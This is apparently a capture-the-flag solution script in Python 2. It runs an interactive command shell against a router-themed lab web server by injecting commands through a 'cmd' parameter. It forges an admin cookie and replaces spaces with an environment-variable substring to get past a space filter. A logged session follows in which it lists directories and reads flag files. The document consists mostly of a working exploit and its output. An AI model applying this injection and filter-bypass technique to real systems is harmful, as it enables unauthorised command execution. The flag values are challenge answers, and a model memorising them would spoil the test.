import requests
import sys

while True:
    cmd = raw_input("windows$ ")
    p = {'cmd':cmd.replace(' ','%programfiles:~10,1%')}
    c = {'auth':'YWRtaW4='}
    r = requests.get('http://crisco.switch.ctf/',params=p,cookies=c)

    if '--full' in sys.argv:
        print r.text.encode('utf-8')
    else:
        s = ''.join(r.text.split('<pre>')[1:])
        s = s[:-74]
        print s.encode('utf-8')

r'''
windows$ dir
 Volume in drive C has no label.
 Volume Serial Number is CA6B-9E9E

 Directory of C:\inetpub\wwwroot

04/13/2017  10:49 PM    <DIR>          .
04/13/2017  10:49 PM    <DIR>          ..
04/13/2017  10:49 PM            98,824 background.jpg
04/13/2017  10:49 PM            63,152 crisco.png
04/13/2017  08:44 PM            99,710 iis-85.png
04/13/2017  08:44 PM               701 iisstart.htm
04/14/2017  10:26 AM             2,440 index.php
04/13/2017  08:58 PM               515 web.config
               6 File(s)        265,342 bytes
               2 Dir(s)  38,473,261,056 bytes free

windows$ find "FLAG" index.php

---------- INDEX.PHP
                        <b>CriscoRouter Management interface - FLAG-436dbd1a04a6395fb4ccfdd6bf56a5d3<br /><br /></b>

windows$ dir ..\..
 Volume in drive C has no label.
 Volume Serial Number is CA6B-9E9E

 Directory of C:\

11/07/2007  08:00 AM            17,734 eula.1028.txt
11/07/2007  08:00 AM            17,734 eula.1031.txt
11/07/2007  08:00 AM            10,134 eula.1033.txt
11/07/2007  08:00 AM            17,734 eula.1036.txt
11/07/2007  08:00 AM            17,734 eula.1040.txt
11/07/2007  08:00 AM               118 eula.1041.txt
11/07/2007  08:00 AM            17,734 eula.1042.txt
11/07/2007  08:00 AM            17,734 eula.2052.txt
11/07/2007  08:00 AM            17,734 eula.3082.txt
11/07/2007  08:00 AM             1,110 globdata.ini
04/13/2017  08:44 PM    <DIR>          inetpub
11/07/2007  08:03 AM           562,688 install.exe
11/07/2007  08:00 AM               843 install.ini
11/07/2007  08:03 AM            76,304 install.res.1028.dll
11/07/2007  08:03 AM            96,272 install.res.1031.dll
11/07/2007  08:03 AM            91,152 install.res.1033.dll
11/07/2007  08:03 AM            97,296 install.res.1036.dll
11/07/2007  08:03 AM            95,248 install.res.1040.dll
11/07/2007  08:03 AM            81,424 install.res.1041.dll
11/07/2007  08:03 AM            79,888 install.res.1042.dll
11/07/2007  08:03 AM            75,792 install.res.2052.dll
11/07/2007  08:03 AM            96,272 install.res.3082.dll
08/22/2013  11:52 AM    <DIR>          PerfLogs
04/22/2017  09:50 PM    <DIR>          Program Files
04/13/2017  08:52 PM    <DIR>          Program Files (x86)
04/22/2017  06:50 PM    <DIR>          SQLServer2016Media
04/13/2017  10:44 PM                37 this_is_a_flag.txt
04/22/2017  09:54 PM    <DIR>          Users
11/07/2007  08:00 AM             5,686 vcredist.bmp
11/07/2007  08:09 AM         1,442,522 VC_RED.cab
11/07/2007  08:12 AM           232,960 VC_RED.MSI
04/22/2017  01:48 PM    <DIR>          Windows
              25 File(s)      3,169,884 bytes
               7 Dir(s)  38,473,261,056 bytes free

windows$ type ..\..\this_is_a_flag.txt
FLAG-d11618760c617c465f9841c72047c39a
'''
